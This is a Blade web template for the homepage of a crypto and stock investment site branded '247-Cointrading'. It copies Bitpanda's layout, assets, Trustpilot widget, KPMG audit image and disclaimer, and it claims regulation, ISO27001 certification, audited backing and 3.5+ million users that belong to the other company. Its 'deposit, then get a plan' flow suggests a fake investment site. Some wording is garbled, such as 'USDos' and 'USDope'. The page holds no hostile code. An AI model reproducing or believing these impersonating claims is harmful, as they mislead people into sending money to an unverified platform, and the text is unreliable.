@include('layouts.partials.header')

    <section id=layout-content tabindex=-1>
        <section class="default uk-padding-remove-bottom uk-section">
            <div class=uk-container>
                <div class="uk-child-width-1-2@m uk-flex-middle uk-grid" uk-grid="">
                    <script defer src="resources/www.livecoinwatch.com/static/lcw-widget.js"></script>
                    <div class="livecoinwatch-widget-5" lcw-base="USD" lcw-color-tx="#999999" lcw-marquee-1="coins" lcw-marquee-2="movers" lcw-marquee-items="10"></div>
                    <div class=default>
                        <section class="module-text uk-padding-remove-bottom uk-padding-remove-top uk-section uk-text-left uk-text-left@m">
                            <div class=module-text__content>
                                <h1>Invest in what <br>you believe in</h1>
                            </div>
                            <div class="js-bp3-cta-button module-text__buttons"><span class=primary-button><a class="desktop-button tk-get-started-button uk-button uk-button-large uk-button-primary" href="register"> Start investing </a> <a class="mobile-button tk-get-app-button uk-button uk-button-large uk-button-primary" href="register"> Start investing </a></span> </div>
                            <script>
                                window.initScriptLater = function(scriptUrl, fallback) {
                                    const script = document.createElement("script");
                                    script.onload = fallback;
                                    script.src = scriptUrl;

                                    document.addEventListener("readystatechange", () => {
                                        if (document.readyState === "interactive") {
                                            document.head.appendChild(script);
                                        }
                                    });
                                };

                                window.initScriptLater("resources/cdn.bitpanda.com/app/v2/js/cta-button.minb126.js?id=d34a8a89944479eef669", () =>
                                    window.initCtaButton()
                                );

                            </script>
                        </section>
                    </div>
                    <div class=default>
                        <link href="resources/cdn.bitpanda.com/app/v2/css/hero-ticker.min76f7.css?id=d72e3fcdab7eac55cb76" rel=stylesheet>
                        <div class="bp3-hero-ticker js-bp3-hero-ticker-1685902989">
                            <div class=bp3-hero-ticker__assets></div>
                            <div class=bp3-hero-ticker__aside>
                                <div class=bp3-hero-ticker__image-container><img alt="Hero ticker" src="resources/1/img/Hero.png"> </div>
                            </div>
                        </div>
                        <script>
                            window.initScriptLater = function(scriptUrl, fallback) {
                                const script = document.createElement("script");
                                script.onload = fallback;
                                script.src = scriptUrl;

                                document.addEventListener("readystatechange", () => {
                                    if (document.readyState === "interactive") {
                                        document.head.appendChild(script);
                                    }
                                });
                            };

                            window.initScriptLater("resources/cdn.bitpanda.com/app/v2/js/hero-ticker.minda91.js?id=08a6562cc452f266d797", () =>
                                window.initHeroTicker("1,85,28", ".js-bp3-hero-ticker-1685902989")
                            );

                        </script>
                        <section class="module-text uk-padding-small-bottom uk-padding-small-top uk-section uk-text-right uk-text-right@m">
                            <div class=module-text__content>
                                <p>Past performance is no indication of future performance.
                            </div>
                        </section>
                    </div>
                </div>
            </div>
        </section>
        <section class="uk-padding-remove-bottom uk-padding-small-top uk-section">
            <div class="default uk-container">
                <section class="module-steps module-steps--has-image module-steps--image-48x48 uk-section">
                    <div class=uk-container>
                        <div class="module-steps__main uk-child-width-1-1 uk-child-width-1-2@m uk-child-width-1-3@l uk-flex-center uk-flex-top uk-grid uk-grid-match">
                            <div class="module-steps__step module-steps__step--has-image">
                                <div class="module-steps__step-image uk-text-left">
                                    <picture><img alt="" class="lazyload module-steps__image-background" data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Regulated.svg uk-img=""> </picture>
                                </div>
                                <div class="module-steps__step-content uk-text-left">
                                    <div>
                                        <h3>Regulated</h3>
                                        <p><strong>Austria based and America regulated</strong> <br>crypto &amp; securities broker platform <br>
                                    </div>
                                </div>
                            </div>
                            <div class="module-steps__step module-steps__step--has-image module-steps__step-border">
                                <div class="module-steps__step-image uk-text-left">
                                    <picture><img alt="" class="lazyload module-steps__image-background" data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Secure.svg uk-img=""> </picture>
                                </div>
                                <div class="module-steps__step-content uk-text-left">
                                    <div>
                                        <h3>Safe and secure</h3>
                                        <p><strong>Funds secured</strong> in offline wallets. <br><strong>Fully compliant</strong> with America data, <br>IT and money laundering security standards <br>
                                    </div>
                                </div>
                            </div>
                            <div class="module-steps__step module-steps__step--has-image module-steps__step-border">
                                <div class="module-steps__step-image uk-text-left">
                                    <picture><img alt="" class="lazyload module-steps__image-background" data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Trusted.svg uk-img=""> </picture>
                                </div>
                                <div class="module-steps__step-content uk-text-left">
                                    <div>
                                        <h3>Trusted</h3>
                                        <p><strong>3.5+ million</strong> happy users. <br>Excellent Trustpilot rating. <br>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="module-steps__footer uk-text-left">
                            <div class="js-bp3-cta-button module-text__buttons"></div>
                            <script>
                                window.initScriptLater = function(scriptUrl, fallback) {
                                    const script = document.createElement("script");
                                    script.onload = fallback;
                                    script.src = scriptUrl;

                                    document.addEventListener("readystatechange", () => {
                                        if (document.readyState === "interactive") {
                                            document.head.appendChild(script);
                                        }
                                    });
                                };

                                window.initScriptLater("resources/cdn.bitpanda.com/app/v2/js/cta-button.minb126.js?id=d34a8a89944479eef669", () =>
                                    window.initCtaButton()
                                );

                            </script>
                        </div>
                    </div>
                </section>
            </div>
        </section>
        <hr class=uk-margin-remove>
        <section class="default uk-section">
            <div class="default uk-container">
                <section class="module-text uk-padding-remove-bottom uk-padding-remove-top uk-section uk-text-center@m uk-text-left">
                    <div class=module-text__content>
                        <p class=bp-preheader>INVEST
                        <h2>All your investments. <br>All on 247-Cointrading</h2>
                    </div>
                </section>
            </div>
        </section>
        <div class="uk-padding-remove-bottom uk-padding-remove-top uk-section">
            <div class=uk-container>
                <div class=bp3-grid style="--bp3-grid-template-columns:1fr 1fr 1fr;--bp3-grid-template-columns-tablet:1fr 1fr 1fr">
                    <div class="bp3-card bp3-card--column bp3-card--gray bp3-card--image-bottom-right">
                        <div class=bp3-card__content>
                            <h3><a href="login">Cryptocurrencies</a></h3>
                            <p>Buy, sell &amp; swap the cryptocurrencies you want anytime, anywhere.
                        </div>
                        <div class=bp3-card__image>
                            <picture>
                                <source data-srcset="resources/1/img/Invest-Crypto.png" type=image/png>
                                <img alt="" class=lazyload data-src="resources/1/img/Invest-Crypto.png">
                            </picture>
                        </div>
                    </div>
                    <div class="bp3-card bp3-card--column bp3-card--gray bp3-card--image-bottom-right">
                        <div class=bp3-card__content>
                            <h3><a href="#">Stocks*</a></h3>
                            <p>Invest in fractions of your favourite companies without committing to a whole share
                            <p class=bp-info-tooltip>Our derivative contracts allow you to fractionally invest in stocks and ETFs that cost hundreds or thousands of US for a single share from as little as $1. This gives you the flexibility to invest in the companies or ETFs you believe in as much as you want, or to try your hand at investing.
                        </div>
                        <div class=bp3-card__image>
                            <picture>
                                <source data-srcset=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Invest-Stocks%20.png type=image/png>
                                <img alt="" class=lazyload data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Invest-Stocks%20.png>
                            </picture>
                        </div>
                    </div>
                    <div class="bp3-card bp3-card--column bp3-card--gray bp3-card--image-bottom-right">
                        <div class=bp3-card__content>
                            <h3><a href="#">ETFs*</a></h3>
                            <p>Invest in fractions of your favourite ETFs* without committing to a whole share
                            <p class=bp-info-tooltip>Our derivative contracts allow you to fractionally invest in stocks and ETFs that cost hundreds or thousands of USDos for a single share from as little as $1. This gives you the flexibility to invest in the companies or ETFs you believe in as much as you want, or to try your hand at investing.
                        </div>
                        <div class=bp3-card__image>
                            <picture>
                                <source data-srcset=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/ETFs.png type=image/png>
                                <img alt="" class=lazyload data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/ETFs.png>
                            </picture>
                        </div>
                    </div>
                    <div class="bp3-card bp3-card--column bp3-card--gray bp3-card--image-bottom-right">
                        <div class=bp3-card__content>
                            <h3><a href="#">Commodities*</a></h3>
                            <p>Fortify your portfolio with commodities* and shield it against inflation
                            <p class=bp-info-tooltip>Our derivative contracts allow you to fractionally invest in stocks and ETFs that cost hundreds or thousands of USDos for a single share from as little as $1. This gives you the flexibility to invest in the companies or ETFs you believe in as much as you want, or to try your hand at investing.
                        </div>
                        <div class=bp3-card__image>
                            <picture>
                                <source data-srcset=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Commodities.png type=image/png>
                                <img alt="" class=lazyload data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Commodities.png>
                            </picture>
                        </div>
                    </div>
                    <div class="bp3-card bp3-card--column bp3-card--gray bp3-card--image-bottom-right">
                        <div class=bp3-card__content>
                            <h3><a href="#">Crypto Indices</a></h3>
                            <p>Auto-invest in the whole crypto market with a single click
                        </div>
                        <div class=bp3-card__image>
                            <picture>
                                <source data-srcset=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Invest-BCI.png type=image/png>
                                <img alt="" class=lazyload data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Invest-BCI.png>
                            </picture>
                        </div>
                    </div>
                    <div class="bp3-card bp3-card--column bp3-card--gray bp3-card--image-bottom-right">
                        <div class=bp3-card__content>
                            <h3><a href="#">Precious Metals</a></h3>
                            <p>Diversify your portfolio by investing in physically-backed precious metals
                        </div>
                        <div class=bp3-card__image>
                            <picture>
                                <source data-srcset=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Invest-Metals.png type=image/png>
                                <img alt="" class=lazyload data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Invest-Metals.png>
                            </picture>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <section class="uk-padding-small-bottom uk-padding-small-top uk-section">
            <div class="default uk-container">
                <section class="module-text uk-padding-remove-bottom uk-padding-remove-top uk-section uk-text-center uk-text-center@m">
                    <div class=module-text__content>
                        <p class=bp-text--sm>247-Cointrading Stocks enables investing in fractional stocks. Fractional stocks in USDope are always enabled via a contract which replicates the underlying stock or ETF (financial instruments pursuant to section 1 item 7 lit. d WAG 2018). Investing in stocks and ETFs carries risks. For more details see the prospectus at 247cointrading.com
                    </div>
                </section>
            </div>
        </section>
        <section class="default uk-padding-small-bottom uk-section">
            <div class="default uk-container">
                <section class="module-text uk-padding-remove-bottom uk-section uk-text-center@m uk-text-left">
                    <div class=module-text__content>
                        <p class=bp-preheader>HOW IT WORKS
                        <h2>Get started in minutes</h2>
                    </div>
                </section>
            </div>
        </section>
        <section class="uk-padding-small-top uk-section">
            <div class="bp3-vs__container uk-container">
                <div class="bp3-vs js-bp3-vs-1778161841" data-sv-speed=5000 style="--bp3-vs-interval-speed: 5000ms; --bp3-vs-slide-count: 6;" tabindex=-1>
                    <ul class=bp3-vs__slides>
                        <li class=bp3-vs__slide>
                            <div>
                                <img alt="" class=bp3-vs__slide__image src="resources/1/img/Register.png">
                                <div class=bp3-vs__slide__content>
                                    <span class=bp3-vs__slide__number>01</span>
                                    <h3><strong>Register</strong></h3>
                                    <p>Sign up to create your free 247-cointrading account.
                                    <p><a class="bp-button bp-button--primary" href="app/register73a6.html?origin=web">Get started</a>
                                </div>
                            </div>
                        <li class=bp3-vs__slide>
                            <div>
                                <img alt="" class=bp3-vs__slide__image src="resources/1/img/Register1.png">
                                <div class=bp3-vs__slide__content>
                                    <span class=bp3-vs__slide__number>02</span>
                                    <h3><strong>Login</strong></h3>
                                    <p>Login your account with one of our trusted verification partners.
                                    <p><a class="bp-button bp-button--primary" href="register">Get started</a>
                                </div>
                            </div>
                        <li class=bp3-vs__slide>
                            <div>
                                <img alt="" class=bp3-vs__slide__image src="resources/1/img/Register2.html">
                                <div class=bp3-vs__slide__content>
                                    <span class=bp3-vs__slide__number>03</span>
                                    <h3><strong>Deposit</strong></h3>
                                    <p>Deposit your funds securely through popular options.
                                    <p><a class="bp-button bp-button--primary" href="login">Get started</a>
                                </div>
                            </div>
                        <li class=bp3-vs__slide>
                            <div>
                                <img alt="" class=bp3-vs__slide__image src="resources/1/img/Register3.html">
                                <div class=bp3-vs__slide__content>
                                    <span class=bp3-vs__slide__number>04</span>
                                    <h3><strong>Plans/Withdrawal</strong></h3>
                                    <p>Get a plan and invest/ assets 24/7.
                                    <p><a class="bp-button bp-button--primary" href="login">Get started</a>
                                </div>
                            </div>
                    </ul>
                    <ul class=bp3-vs__nav>
                        <li class=bp3-vs__nav__item--prev>
                        <li class=bp3-vs__nav__item>
                            <a>
                                <div class=bp3-vs__nav__item__ring>
                                    <svg xmlns=http://www.w3.org/2000/svg id=asset-data__count__svg version=1.1>
                                        <circle cx=50% cy=50% fill=#f5f5f5 r=12 stroke=#E2E2E2 stroke-width=1px></circle>
                                        <circle cx=50% cy=50% fill=transparent r=12 stroke=#27D17F stroke-dasharray=75 stroke-dashoffset=75 stroke-linecap=butt stroke-width=1px></circle>
                                    </svg>
                                    <span>01</span>
                                </div>
                            </a>
                        <li class=bp3-vs__nav__item>
                            <a>
                                <div class=bp3-vs__nav__item__ring>
                                    <svg xmlns=http://www.w3.org/2000/svg id=asset-data__count__svg version=1.1>
                                        <circle cx=50% cy=50% fill=#f5f5f5 r=12 stroke=#E2E2E2 stroke-width=1px></circle>
                                        <circle cx=50% cy=50% fill=transparent r=12 stroke=#27D17F stroke-dasharray=75 stroke-dashoffset=75 stroke-linecap=butt stroke-width=1px></circle>
                                    </svg>
                                    <span>02</span>
                                </div>
                            </a>
                        <li class=bp3-vs__nav__item>
                            <a>
                                <div class=bp3-vs__nav__item__ring>
                                    <svg xmlns=http://www.w3.org/2000/svg id=asset-data__count__svg version=1.1>
                                        <circle cx=50% cy=50% fill=#f5f5f5 r=12 stroke=#E2E2E2 stroke-width=1px></circle>
                                        <circle cx=50% cy=50% fill=transparent r=12 stroke=#27D17F stroke-dasharray=75 stroke-dashoffset=75 stroke-linecap=butt stroke-width=1px></circle>
                                    </svg>
                                    <span>03</span>
                                </div>
                            </a>
                        <li class=bp3-vs__nav__item>
                            <a>
                                <div class=bp3-vs__nav__item__ring>
                                    <svg xmlns=http://www.w3.org/2000/svg id=asset-data__count__svg version=1.1>
                                        <circle cx=50% cy=50% fill=#f5f5f5 r=12 stroke=#E2E2E2 stroke-width=1px></circle>
                                        <circle cx=50% cy=50% fill=transparent r=12 stroke=#27D17F stroke-dasharray=75 stroke-dashoffset=75 stroke-linecap=butt stroke-width=1px></circle>
                                    </svg>
                                    <span>04</span>
                                </div>
                            </a>
                        <li class=bp3-vs__nav__item--next>
                    </ul>
                </div>
                <script>
                    window.initScriptLater = function(scriptUrl, fallback) {
                        const script = document.createElement("script");
                        script.onload = fallback;
                        script.src = scriptUrl;

                        document.addEventListener("readystatechange", () => {
                            if (document.readyState === "interactive") {
                                document.head.appendChild(script);
                            }
                        });
                    };

                    window.initScriptLater(
                        "resources/cdn.bitpanda.com/app/v2/js/vertical-slider.min038a.js?id=96313ad2b45589c49487",
                        () => window.initVerticalSlider(1778161841)
                    );

                </script>
            </div>
        </section>
        <section class="default uk-padding-small-top uk-section">
            <div class="default uk-container"></div>
        </section>
        <section class="uk-padding-remove-bottom uk-section">
            <div class="uk-container uk-padding-large-bottom uk-text-center">
                <span class="bp-preheader uk-text-center@m uk-text-left"> PRICES </span>
                <h2 class="uk-margin-auto uk-text-center@m uk-text-left uk-width-4-5@m"> Keep tabs on your favourite assets </h2>
            </div>
            <div data-currency=USD data-i18n="{&quot;buy&quot;:&quot;Buy&quot;,&quot;all&quot;:&quot;All assets&quot;,&quot;commodity&quot;:&quot;Metals&quot;,&quot;cryptocoin&quot;:&quot;Crypto&quot;,&quot;index&quot;:&quot;Crypto Indices&quot;,&quot;stock&quot;:&quot;Stocks*&quot;,&quot;etf&quot;:&quot;ETFs*&quot;, &quot;etc&quot;:&quot;Commodities&quot;}" data-locale=en data-vue-app=prices-carousel style=overflow:hidden;></div>
            <div class="uk-container uk-padding-large-top uk-text-center">
                <div class="js-bp3-cta-button module-text__buttons"><span class=primary-button><a class="desktop-button tk-get-started-button uk-button uk-button-large uk-button-primary" href="login"> See all prices </a> <a class="mobile-button uk-button uk-button-large uk-button-primary" href="login"> See all prices </a></span> </div>
                <script>
                    window.initScriptLater = function(scriptUrl, fallback) {
                        const script = document.createElement("script");
                        script.onload = fallback;
                        script.src = scriptUrl;

                        document.addEventListener("readystatechange", () => {
                            if (document.readyState === "interactive") {
                                document.head.appendChild(script);
                            }
                        });
                    };

                    window.initScriptLater("resources/cdn.bitpanda.com/app/v2/js/cta-button.minb126.js?id=d34a8a89944479eef669", () =>
                        window.initCtaButton()
                    );

                </script>
            </div>
            <script src="resources/cdn.bitpanda.com/app/v2/js/dist/prices-carousel/prices-carousel.min9866.js?id=3240e18a15e1d86c42cf"></script>
        </section>
        <section class="uk-padding-remove-top uk-padding-small-bottom uk-section">
            <div class="default uk-container">
                <section class="module-text uk-padding-small-top uk-section uk-text-center@m uk-text-left">
                    <div class=module-text__content>
                        <p class=bp-text--sm>Past performance is not an indication of future performance
                    </div>
                </section>
            </div>
        </section>
        <div class="default uk-section">
            <div class=uk-container>
                <div class=bp3-grid style="--bp3-grid-template-columns:1fr 1fr;--bp3-grid-template-columns-tablet:1fr 1fr">
                    <div class="bp3-card bp3-card--column bp3-card--gray bp3-card--image-bottom-right">
                        <div class=bp3-card__content>
                            <h3>Best-in-class security</h3>
                            <p>Our ISO27001 certification proves that we follow the highest security standards.

                        </div>
                        <div class=bp3-card__image>
                            <picture>
                                <source data-srcset=https://cdn.bitpanda.com/media/security/securitycertificateiso.png type=image/png>
                                <img alt="" class=lazyload data-src=https://cdn.bitpanda.com/media/security/securitycertificateiso.png>
                            </picture>
                        </div>
                    </div>
                    <div class="bp3-card bp3-card--column bp3-card--gray bp3-card--image-bottom-right">
                        <div class=bp3-card__content>
                            <h3>Fully backed user assets</h3>
                            <p>Auditor KPMG has signed off that our funds exceed all customer holdings.

                        </div>
                        <div class=bp3-card__image>
                            <picture>
                                <source data-srcset=https://cdn.bitpanda.com/media/security/KPMG-report-crypto-funds-held-in-Bitpanda-crypto-storage-exceed-customer-holdings.jpg type=image/png>
                                <img alt="" class=lazyload data-src=https://cdn.bitpanda.com/media/security/KPMG-report-crypto-funds-held-in-Bitpanda-crypto-storage-exceed-customer-holdings.jpg>
                            </picture>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <section class="default uk-padding-small-top uk-section">
            <div class="default uk-container">
                <section class="module-text uk-section uk-text-center@m uk-text-left">
                    <div class=module-text__content>
                        <p class=bp-preheader>FEATURES
                        <h2>More than an investment platform</h2>
                    </div>
                </section>
                <div class="bp3-card bp3-card--black bp3-card--image-right-overlap bp3-card--row">
                    <div class=bp3-card__content>
                        <h1><br> </h1>
                        <h2 class=bp-preheader--badge>SAVINGS PLAN</h2>
                        <h2>Save effortlessly <br>with a savings plan</h2>
                        <p><a href="login">Get started</a>
                    </div>
                    <div class=bp3-card__image>
                        <picture>
                            <source data-srcset=https://cdn.bitpanda.com/media/Feature%203.0/saving%20plans/22_08_Website_Banner%20for%20free%20saving%20plans%20on%20BCI.png type=image/png>
                            <img alt="" class=lazyload data-src=https://cdn.bitpanda.com/media/Feature%203.0/saving%20plans/22_08_Website_Banner%20for%20free%20saving%20plans%20on%20BCI.png>
                        </picture>
                    </div>
                </div>
                <section class="module-text uk-padding-small-bottom uk-padding-small-top uk-section uk-text-center@m uk-text-left">
                    <div class=module-text__content></div>
                </section>
                <div class="uk-container uk-padding-large-top uk-text-center"><a class="bp-button bp-button--large bp-button--primary" href="en/features.html">See all features</a> </div>
            </div>
        </section>
        <section class="uk-padding-remove-bottom uk-padding-small-top uk-section">
            <div class="default uk-container">
                <section class="module-text uk-section uk-text-center@m uk-text-left">
                    <div class=module-text__content>
                        <p class=bp-preheader>LEARN
                        <h2>Boost your financial literacy skills</h2>
                    </div>
                </section>
            </div>
        </section>
        <div class="default uk-padding-remove-top uk-section">
            <div class=uk-container>
                <div class=bp3-grid style="--bp3-grid-template-columns:1fr 1fr;--bp3-grid-template-columns-tablet:1fr 1fr">
                    <div class="bp3-card bp3-card--column bp3-card--dark-orange bp3-card--image-bottom-right">
                        <div class=bp3-card__content>
                            <p class=bp-preheader--badge>247-Cointrading BLOG
                            <h3><strong>Get the latest company news and industry updates</strong></h3>
                        </div>
                        <div class=bp3-card__image>
                            <picture>
                                <source data-srcset=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Blog.png type=image/png>
                                <img alt="" class=lazyload data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Blog.png>
                            </picture>
                        </div>
                    </div>
                    <div class="bp3-card bp3-card--column bp3-card--green bp3-card--image-bottom-right">
                        <div class=bp3-card__content>
                            <p class=bp-preheader--badge>247-Cointrading ACADEMY
                            <h3><strong>Learn all about investing, Bitcoin and blockchain</strong></h3>
                        </div>
                        <div class=bp3-card__image>
                            <picture>
                                <source data-srcset=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Academy.png type=image/png>
                                <img alt="" class=lazyload data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Academy.png>
                            </picture>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <section class="default uk-section">
            <div class="default uk-container">
                <section class="module-text uk-section uk-text-center@m uk-text-left">
                    <div class=module-text__content>
                        <p class=bp-preheader>REVIEWS
                        <h2>Don't just take our word for it</h2>
                    </div>
                </section>
                <div class=trustpilot-widget data-businessunit-id=561fee100000ff00058462c7 data-locale=en-GB data-review-languages=en data-stars=5 data-style-height=140px data-style-width=100% data-template-id=53aa8912dec7e10d38f59f36 data-theme=light><a href="https://uk.trustpilot.com/review/www.bitpanda.com" rel=noopener target=_blank>Trustpilot</a> </div>
            </div>
        </section>
        <hr class=uk-margin-remove>
        <section class="uk-padding-remove-bottom uk-padding-remove-top uk-section">
            <div class="default uk-container">
                <section class="module-text uk-padding-remove-bottom uk-section uk-text-center@m uk-text-left">
                    <div class=module-text__content>
                        <p class=bp-preheader>HELP
                        <h2>Questions? We’re here for you</h2>
                    </div>
                </section>
                <section class="module-steps module-steps--has-image module-steps--image-48x48 uk-section">
                    <div class=uk-container>
                        <div class="module-steps__main uk-child-width-1-1 uk-child-width-1-2@m uk-child-width-1-3@l uk-flex-center uk-flex-top uk-grid uk-grid-match">
                            <div class="module-steps__step module-steps__step--has-image">
                                <div class="module-steps__step-image uk-text-left">
                                    <picture><img alt="" class="lazyload module-steps__image-background" data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Helpdesk.svg uk-img=""> </picture>
                                </div>
                                <div class="module-steps__step-content uk-text-left">
                                    <div>
                                        <h3><strong>Helpdesk</strong></h3>
                                        <p>Our 247-Cointrading Helpdesk is loaded with in-depth articles to help you troubleshoot problems or learn more on your own.
                                        <p><br>
                                    </div>
                                </div>
                            </div>
                            <div class="module-steps__step module-steps__step--has-image module-steps__step-border">
                                <div class="module-steps__step-image uk-text-left">
                                    <picture><img alt="" class="lazyload module-steps__image-background" data-src=https://cdn.bitpanda.com/media/Website%203.0/Home%203.0/Community.svg uk-img=""> </picture>
                                </div>
                                <div class="module-steps__step-content uk-text-left">
                                    <div>
                                        <h3><strong>Community</strong></h3>
                                        <p>Join our online community so you can be the first to hear about company news, new products and more.
                                        <p><br>
                                        <p><br>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="module-steps__footer uk-text-left">
                            <div class="js-bp3-cta-button module-text__buttons"></div>
                            <script>
                                window.initScriptLater = function(scriptUrl, fallback) {
                                    const script = document.createElement("script");
                                    script.onload = fallback;
                                    script.src = scriptUrl;

                                    document.addEventListener("readystatechange", () => {
                                        if (document.readyState === "interactive") {
                                            document.head.appendChild(script);
                                        }
                                    });
                                };

                                window.initScriptLater("resources/cdn.bitpanda.com/app/v2/js/cta-button.minb126.js?id=d34a8a89944479eef669", () =>
                                    window.initCtaButton()
                                );

                            </script>
                        </div>
                    </div>
                </section>
            </div>
        </section>
        <hr class=uk-margin-remove>
        <section class="default footerbanner uk-section" style="display: none;">
            <div class=uk-container>
                <div class=uk-grid>
                    <div class="uk-margin-medium-top uk-text-small">
                        <p><em>247-Cointrading GmbH ve grup şirketleri (247-Cointrading) Türk Parasının Kıymetini’nin Korunması Hakkında 32 sayılı Karar’ın 2/b maddesine göre Türkiye’de yerleşik sayılan hiçbir kişiye yönelik olarak 6362 sayılı Sermaye Piyasası Kanunu başta olmak üzere Türkiye Cumhuriyeti Devleti mevzuatı hükümleri gereği Türkiye’de faaliyet izni gerektiren hiçbir sermaye piyasası faaliyetine dair hizmet sunmamaktadır. Şayet Bitpanda’nın yabancı sermaye piyasalarında vermiş olduğu hizmetlerden Türkiye’de yerleşik kişilerin faydalandığı tespit edilecek olursa tüm zararları kullanıcıya ait olmak üzere bu hizmetler ivedilikle sona erdirilecektir.</em>
                    </div>
                </div>
            </div>
        </section>
    </section>
@include('layouts.partials.footer')